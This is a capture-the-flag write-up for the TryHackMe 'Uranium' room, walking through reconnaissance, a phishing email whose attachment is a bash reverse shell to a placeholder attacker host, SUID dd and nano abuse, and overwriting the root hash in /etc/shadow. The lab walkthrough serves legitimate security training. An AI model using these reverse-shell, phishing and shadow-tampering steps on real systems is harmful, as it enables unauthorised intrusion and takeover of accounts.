# Tryhackme Writeup
## Uranium CTF

link room: https://tryhackme.com/room/uranium

Created by hakanbey01


## Tasks
 What is the required password for the chat app? 

 What is the password of hakanbey user?

user_1.txt

user_2.txt

web_flag.txt

root.txt

## First Informations

![4](https://user-images.githubusercontent.com/74853138/130369557-9327a806-4a7d-46c8-a548-1812f327142c.png)

```
We have reached out a account one of the employees
hakanbey
```

Visiting His Twitter Profile

![2021-08-22_20-52](https://user-images.githubusercontent.com/74853138/130368255-f0942d95-4f9c-4855-8ad8-d61f46bc19a2.png)



![2](https://user-images.githubusercontent.com/74853138/130368297-f352ad99-8065-4629-8b7a-968c453d1e1e.png)


![3](https://user-images.githubusercontent.com/74853138/130368301-22801600-0328-4aaf-b14a-35e2632ce2b9.png)

We got Hostname and Email address 

host:  uranium.thm

Email: hakanbey@uranium.thm

add ip to /etc/hosts


## Nmap Scan
```
root@ubuntu:~/THM/uranum# nmap -sC -sV -Pn  -n -A 10.10.76.40
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-22 20:46 CET
Nmap scan report for 10.10.76.40
Host is up (0.11s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 (RSA)
|   256 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 (ECDSA)
|_  256 c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Not valid before: 2021-04-09T21:40:53
|_Not valid after:  2031-04-07T21:40:53
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Uranium Coin
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=8/22%OT=22%CT=1%CU=33867%PV=Y%DS=2%DC=T%G=Y%TM=6122A9A
OS:D%P=x86_64-pc-linux-gnu)SEQ(SP=F9%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST11
OS:NW6%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(
OS:R=Y%DF=Y%T=40%W=F507%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 110/tcp)
HOP RTT       ADDRESS
1   115.77 ms 10.8.0.1
2   115.23 ms 10.10.76.40

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.58 seconds


```
# Open ports 
```
22, 25, 80
```

![3](https://user-images.githubusercontent.com/74853138/130368301-22801600-0328-4aaf-b14a-35e2632ce2b9.png)

```
here we can send mail to Hakanbey with application attached, and let's send it with our payload inside.
```
## Create our payload
```
root@ubuntu:~/THM/uranum# cat application
bash -c "bash -i >& /dev/tcp/attacker_ip/4444 0>&1"

```
Create Listner session with nc

```
root@ubuntu:~/THM/uranum# nc -nlvp 4444
listening on [any] 4444 ...

 ```
 Let's send this to Hakanbey using ssmtp or sendEmail or you we can use swask tool 

 ```
 https://github.com/jetmore/swaks
 ```

using swaks

```
root@ubuntu:~/THM/uranum# swaks --to hakanbey@uranium.thm --from hakanbey@uranium.thm --header "Subject: Phishing" --body "any message" --server 10.10.76.40 --attach application
```
```
root@ubuntu:~/THM/uranum#  swaks --to hakanbey@uranium.thm --from hakanbey@uranium.thm --header "Subject: Phishing" --body "any message" --server 10.10.76.40 --attach 
application                                                                                                                                                            
*** DEPRECATION WARNING: Inferring a filename from the argument to --attach will be removed in the future.  Prefix filenames with '@' instead.                         
=== Trying 10.10.76.40:25...                                                                                                                                           
=== Connected to 10.10.76.40.                                                                                                                                          
<-  220 uranium ESMTP Postfix (Ubuntu)
 -> EHLO ubuntu                        
<-  250-uranium                                                                    
<-  250-PIPELINING                  
<-  250-SIZE 10240000         
<-  250-VRFY                      
<-  250-ETRN                                                                       
<-  250-STARTTLS                                                                   
<-  250-ENHANCEDSTATUSCODES            
<-  250-8BITMIME                                                                   
<-  250-DSN                 
<-  250 SMTPUTF8                                                                               
 -> MAIL FROM:<hakanbey@uranium.thm>                                                           
<-  250 2.1.0 Ok                                                                                               
 -> RCPT TO:<hakanbey@uranium.thm>                                                             
<-  250 2.1.5 Ok                   
 -> DATA                                                                           
<-  354 End data with <CR><LF>.<CR><LF>                                                                                               
 -> Date: Sun, 22 Aug 2021 21:34:08 +0100                                          
 -> To: hakanbey@uranium.thm                                                                                                          
 -> From: hakanbey@uranium.thm     
 -> Subject: Phishing                                                              
 -> Message-Id: <20210822213408.041279@ubuntu>                                                                                        
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/                                   
 -> MIME-Version: 1.0                          
 -> Content-Type: multipart/mixed; boundary="----=_MIME_BOUNDARY_000_41279"                                    
 ->                                                                                            
 -> ------=_MIME_BOUNDARY_000_41279                    
 -> Content-Type: text/plain                                                                                   
 ->                                                                
 -> any message                                                    
 -> ------=_MIME_BOUNDARY_000_41279                                                                                                   
 -> Content-Type: application/octet-stream; name="application"                                                                        
 -> Content-Description: application                               
 -> Content-Disposition: attachment; filename="application"                                                                           
 -> Content-Transfer-Encoding: BASE64                              
 ->                                                                
 -> [hidden]]
  -> 
 -> ------=_MIME_BOUNDARY_000_41279--
 -> 
 -> 
 -> .
<-  250 2.0.0 Ok: queued as D361A4012E
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.


 ```


Wait for 1 minute and BOOM we got Shell

```
root@ubuntu:~/THM/uranum# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.xx.xx] from (UNKNOWN) [10.10.xx.xx] 58774
bash: cannot set terminal process group (1898): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$ 

```

## Stabilze shell and enumerate

```
hakanbey@uranium:~$ export TERM=xterm
export TERM=xterm
hakanbey@uranium:~$ python3 -c 'import pty;pty.spawn("/bin/bash")'    
python3 -c 'import pty;pty.spawn("/bin/bash")'
hakanbey@uranium:~$ ^Z
[1]+  Stopped                 nc -nlvp 4444
root@ubuntu:~/THM/uranum# stty raw -echo;fg
nc -nlvp 4444

hakanbey@uranium:~$ 
```

## First Flag

```
hakanbey@uranium:~$ ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ cat user_1.txt
thm{USER FLAG .....0da7c}
hakanbey@uranium:~$ 

```

```
hakanbey@uranium:~$ ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ 

hakanbey@uranium:~$ ./chat_with_kral4
PASSWORD :

```
the app need password


```

Change directory to /tmp and upload linpeas.

```

```
hakanbey@uranium:~$ cd /tmp
hakanbey@uranium:/tmp$ wget http://10.8.x.xx/linpeas.sh
--2021-08-22 20:42:29--  http://10.8.xx.xx/linpeas.sh
Connecting to 10.8.xx.xx:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 307434 (300K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 300.23K  26.2KB/s    in 11s     

2021-08-22 20:42:40 (27.1 KB/s) - ‘linpeas.sh’ saved [307434/307434]

hakanbey@uranium:/tmp$
```

After reading carefully hole linpeas report i found this 

```
[+] Finding passwords inside logs (limit 70)                                                                                                                           
Binary file /var/log/hakanbey_network_log.pcap matches                                                                                                                 
Binary file /var/log/journal/d201151764514de6bab90df33f56aa28/user-1000@0005c1a9868986ea-3b258af52c0fc7c3.journal~ matches                                             
Binary file /var/log/journal/d201151764514de6bab90df33f56aa28/user-1000.journal matches                                                                                
/var/log/cloud-init.log:2021-05-04 19:41:15,560 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-05-04 21:00:51,421 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-05-06 11:58:07,761 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-05-06 13:43:33,049 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-05-06 13:49:58,546 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-05-06 14:34:14,232 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/cloud-init.log:2021-08-22 19:45:54,042 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)                                         
/var/log/installer/installer-journal.txt:Apr 09 20:41:11 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.                          
/var/log/installer/installer-journal.txt:Apr 09 20:41:12 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.

```

This 
```
Binary file /var/log/hakanbey_network_log.pcap matches
```
Download the file and open it with wireshark

found the password for the chat app

![5](https://user-images.githubusercontent.com/74853138/130369845-cab0c6e7-d236-482b-a4c3-10fe6c65ed0b.png)

Let's use this password and chat with hakanbey, and this is the fun part i really like it. ^^

```

PASSWORD :[HIDDEN PASSWORD.....56VNG]
kral4:hi hakanbey

->hi
hakanbey:hi
kral4:how are you?

->im fine and you
hakanbey:im fine and you
kral4:what now? did you forgot your password again

->yes please
hakanbey:yes please
kral4:okay your password is [PASSWORD] don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated
hakanbey@uranium:~$ 

```
So we found our 1&2 tasks

 What is the required password for the chat app?  OK

 What is the password of hakanbey user?  OK


## Use ssh with password found

after execute sudo -l we found this

```
hakanbey@uranium:~$ sudo -l
[sudo] password for hakanbey: 
Matching Defaults entries for hakanbey on uranium:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
hakanbey@uranium:~$ 

```

we can swith to other user, Kral4 with sudo and get flag for user2

```
hakanbey@uranium:~$ sudo -u kral4 /bin/bash 
kral4@uranium:~$ 

```
let's do some enumerate to see what we can do with kral4 user

```

kral4@uranium:~$ find / -perm -4000 2>/dev/null                                     
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1

......
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/mount
/bin/dd

```

we found /bin/dd intersting..

![6](https://user-images.githubusercontent.com/74853138/130370048-59f38869-7f91-4f96-88d2-e486cd307966.png)

## web_flag.txt

```
kral4@uranium:~$ find / -type f -name web_flag.txt  2>/dev/null
/var/www/html/web_flag.txt

```
let's use dd to read this

```
kral4@uranium:~$ /bin/dd if=/var/www/html/web_flag.txt
thm{0[web_flag.txt]...0b3e6750a}
0+1 records in
0+1 records out
38 bytes copied, 0.000732727 s, 51.9 kB/s

```
and Voila !!

## root flag
let's root this machine

after doing some enuemrate

we found that root send mail to kral4 here below the mail

```
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--

```

so we understand that when a attack index.html root give SUID to nano in kral4's home.

so let's copied nano to kral4 home

```
kral4@uranium:/var/mail$ cp /bin/nano /home/kral4/

```

```
kral4@uranium:/home/kral4$ ls -lsa
total 384
  4 drwxr-x--- 3 kral4 kral4   4096 Aug 22 21:08 .
  4 drwxr-xr-x 4 root  root    4096 Apr 23 08:50 ..
  0 lrwxrwxrwx 1 root  root       9 Apr 25 11:12 .bash_history -> /dev/null
  4 -rw-r--r-- 1 kral4 kral4    220 Apr  9 21:55 .bash_logout
  4 -rw-r--r-- 1 kral4 kral4   3771 Apr  9 21:55 .bashrc
108 -rwxr-xr-x 1 kral4 kral4 109960 Apr  9 16:35 chat_with_hakanbey
  4 -rw-r--r-- 1 kral4 kral4      5 Aug 22 20:58 .check
  4 drwxrwxr-x 3 kral4 kral4   4096 Apr 10 00:21 .local
244 -rwxr-xr-x 1 kral4 kral4 245872 Aug 22 21:08 nano
  4 -rw-r--r-- 1 kral4 kral4    807 Apr  9 21:55 .profile
  4 -rw-rw-r-- 1 kral4 kral4     38 Apr 10 00:21 user_2.txt
kral4@uranium:/home/kral4$ 
```
lets' do attack to index.html

![7](https://user-images.githubusercontent.com/74853138/130370160-6bda4a1e-e8b9-45ba-ab14-d9ce79242162.png)

```
kral4@uranium:/var/www/html$ echo "rootkit" | dd of=index.html 
0+1 records in
0+1 records out
8 bytes copied, 0.000511221 s, 15.6 kB/s


```
let's do another suid scan

```
find / -perm -4000 2>/dev/null
```

after checking our home we found that root send othet mail that our index.html has been hacked

```
------MIME delimiter for sendEmail-953733.034039946
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I think our index page has been hacked again. You know how to fix it, I am giving authorization.

------MIME delimiter for sendEmail-953733.034039946--

```

after checking our home folder we found root give nano suid
```
kral4@uranium:/home/kral4$ ls -lsa
total 384
  4 drwxr-x--- 3 kral4 kral4   4096 Aug 22 21:08 .
  4 drwxr-xr-x 4 root  root    4096 Apr 23 08:50 ..
  0 lrwxrwxrwx 1 root  root       9 Apr 25 11:12 .bash_history -> /dev/null
  4 -rw-r--r-- 1 kral4 kral4    220 Apr  9 21:55 .bash_logout
  4 -rw-r--r-- 1 kral4 kral4   3771 Apr  9 21:55 .bashrc
108 -rwxr-xr-x 1 kral4 kral4 109960 Apr  9 16:35 chat_with_hakanbey
  4 -rw-r--r-- 1 kral4 kral4      5 Aug 22 20:58 .check
  4 drwxrwxr-x 3 kral4 kral4   4096 Apr 10 00:21 .local
244 -rwsrwxrwx 1 root  root  245872 Aug 22 21:08 nano
  4 -rw-r--r-- 1 kral4 kral4    807 Apr  9 21:55 .profile
  4 -rw-rw-r-- 1 kral4 kral4     38 Apr 10 00:21 user_2.txt
```

# Privilege Escalation
since we can use nano as root 
let's amend root password in /etc/shadow

```
root@ubuntu:~/THM/uranum# openssl passwd -6 P@ssword123!
$6$NhJzSgvySv3.BUWi$gtvPvX61JkAu04qldDuEc5lhuGzF4YM3BLOHSTA5Cv8Qa03Ban.c7NU8hZR45dySrLSZ.qoEidlvdY/.AYeJb1
```
```
kral4@uranium:/home/kral4$ ./nano /etc/shadow
```
```
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
  GNU nano 2.9.3                     /etc/shadow                      Modified  

root:$6$NhJzSgvySv3.BUWi$gtvPvX61JkAu04qldDuEc5lhuGzF4YM3BLOHSTA5Cv8Qa03Ban.c7N$
daemon:*:18480:0:99999:7:::
bin:*:18480:0:99999:7:::
sys:*:18480:0:99999:7:::
sync:*:18480:0:99999:7:::
games:*:18480:0:99999:7:::
man:*:18480:0:99999:7:::
lp:*:18480:0:99999:7:::
mail:*:18480:0:99999:7:::
news:*:18480:0:99999:7:::
uucp:*:18480:0:99999:7:::
proxy:*:18480:0:99999:7:::
www-data:*:18480:0:99999:7:::
backup:*:18480:0:99999:7:::
list:*:18480:0:99999:7:::
irc:*:18480:0:99999:7:::

```
save and do su root with our password P@ssword123!

```
kral4@uranium:/home/kral4$ su root
Password: 
root@uranium:/home/kral4# cd /root
root@uranium:~# ls
htmlcheck.py  root.txt
root@uranium:~# cat root.txt
thm{814980(root Flag)a699cd}
root@uranium:~# 


```
Voila !!!
thanks
